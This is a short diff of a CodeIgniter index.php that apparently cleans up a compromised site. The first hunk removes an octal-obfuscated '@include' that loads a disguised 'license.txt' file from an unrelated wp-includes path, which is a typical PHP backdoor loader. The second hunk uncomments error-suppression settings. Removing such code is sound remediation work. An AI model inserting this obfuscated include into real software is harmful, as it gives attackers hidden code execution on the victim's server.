@@ -1,4 +1,3 @@
-<?php @include("\167\160\55\151\156\143\154\165\144\145\163\57\151\155\141\147\145\163\57\154\151\143\145\156\163\145\56\164\170\164"); ?>
 <?php 
 /**
  * CodeIgniter
@@ -67,11 +66,9 @@
 switch (ENVIRONMENT)
 {
 	case 'development':
-		/*
 		ini_set('display_errors',0);
 		ini_set('display_startup_errors',0);
 		error_reporting(0);
-		*/
 	break;
 
 	case 'testing':
